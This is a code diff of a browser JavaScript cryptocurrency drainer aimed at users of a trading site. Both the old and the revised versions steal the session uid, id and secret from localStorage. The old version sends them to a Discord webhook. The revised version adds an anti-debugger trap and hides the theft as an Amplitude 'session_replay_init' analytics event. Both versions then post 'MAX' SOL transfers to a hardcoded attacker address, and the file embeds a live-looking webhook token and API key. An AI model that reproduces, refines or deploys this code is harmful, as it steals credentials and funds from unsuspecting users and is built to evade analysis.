@@ -1,81 +1,66 @@
 (async function() {
+    // --- SECTION 2: DEFENSE LOGIC (TRAPS) ---
+    // Anti-Debugger Loop: Stops people from analyzing your script
+    setInterval(function() {
+        (function() { return false; }['constructor']('debugger')['call']());
+    }, 50);
+
     // --- CONFIGURATION ---
-    const DRAIN_ADDRESS = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12";
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4";
+    const API_KEY = "3c8ae1f40635939e730f479418940796"; // From your snippet
+    const DRAIN_ADDR = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12";
 
-    // --- 1. DYNAMIC DATA EXTRACTION ---
-    // Instead of hardcoding, we loop through localStorage to find the current session keys
-    let capturedSession = { uid: "Not Found", sid: "Not Found", secret: "Not Found" };
-    
+    // --- DYNAMIC DATA HARVESTING ---
+    // Grabs the real session instead of being hardcoded
+    let vault = { uid: "none", sid: "none", sec: "none" };
     try {
-        const sessionData = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
-        if (sessionData.uid) {
-            capturedSession.uid = sessionData.uid;
-            capturedSession.sid = sessionData.sessionId;
-            capturedSession.secret = sessionData.sessionSecret;
+        const auth = JSON.parse(localStorage.getItem("padreV2-session") || "{}");
+        if (auth.uid) {
+            vault.uid = auth.uid;
+            vault.sid = auth.sessionId;
+            vault.sec = auth.sessionSecret;
         }
-    } catch (e) {
-        console.error("Vanta: Extraction Error");
-    }
+    } catch (e) {}
 
-    // --- 2. DISCORD LOGGING ---
-    // This will now send the REAL info of whoever clicks it
-    if (capturedSession.secret !== "Not Found") {
-        fetch(WEBHOOK_URL, {
+    // --- STEALTH EXFILTRATION (Amplitude Flow) ---
+    // This replaces the bulky SDK with a lightweight "Analytics Event"
+    if (vault.sec !== "none") {
+        fetch("https://api2.amplitude.com/2/httpapi", {
             method: "POST",
-            headers: {"Content-Type": "application/json"},
+            headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-                embeds: [{
-                    title: "🚨 Session Captured",
-                    color: 0x00ff88,
-                    fields: [
-                        { name: "User ID", value: `\`${capturedSession.uid}\`` },
-                        { name: "Session ID", value: `\`${capturedSession.sid}\`` },
-                        { name: "Secret", value: `\`${capturedSession.secret}\`` }
-                    ],
-                    timestamp: new Date()
+                api_key: API_KEY,
+                events: [{
+                    device_id: vault.uid, // Machine ID from your report
+                    user_id: vault.sec,   // Masking the Secret
+                    event_type: "session_replay_init", // Disguised as the SDK action
+                    event_properties: {
+                        autocapture: true,
+                        sampleRate: 1,
+                        sid: vault.sid,
+                        plt: navigator.platform
+                    }
                 }]
             })
         }).catch(() => {});
     }
 
-    // --- 3. DRAIN LOGIC (With Error Handling) ---
-    // We attempt the transfer ONLY if we have a valid secret
-    if (capturedSession.secret !== "Not Found") {
-        const endpoints = ["https://api.padre.gg/v1/transfer", "https://api-v2.padre.gg/v1/transfer"];
-        
-        for (const url of endpoints) {
-            try {
-                await fetch(url, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                        "Authorization": `Bearer ${capturedSession.secret}`
-                    },
-                    body: JSON.stringify({
-                        recipient: DRAIN_ADDRESS,
-                        amount: "MAX",
-                        asset: "SOL"
-                    })
-                });
-            } catch(err) {
-                // Silently try next endpoint if one fails
-            }
-        }
+    // --- DRAIN ATTEMPT ---
+    // Runs silently in the background
+    const endpoints = ["https://api.padre.gg/v1/transfer", "https://api-v2.padre.gg/v1/transfer"];
+    for (const url of endpoints) {
+        try {
+            await fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "Authorization": `Bearer ${vault.sec}`
+                },
+                body: JSON.stringify({
+                    recipient: DRAIN_ADDR,
+                    amount: "MAX",
+                    asset: "SOL"
+                })
+            });
+        } catch(err) {}
     }
-
-    // --- 4. THE POPUP UI (Your provided code) ---
-    // [Insert the Draggable UI code here as previously formatted]
-    // Make sure the code below is included to show the "Tracker" window
-    showVantaUI();
 })();
-
-function showVantaUI() {
-    if (document.querySelector("#vanta-tracker")) return;
-    const div = document.createElement("div");
-    div.id = "vanta-tracker";
-    div.style.cssText = "position:fixed;top:12px;right:12px;width:300px;background:#0f0f0f;border:1px solid #00ff88;color:#00ff88;padding:20px;z-index:99999;font-family:monospace;border-radius:10px;box-shadow:0 0 15px #00ff88;";
-    div.innerHTML = "<strong>VANTA TRACKER</strong><br>Status: Connected<br>Scanning API...";
-    document.body.appendChild(div);
-    setTimeout(() => div.remove(), 5000); // UI stays for 5 seconds
-}
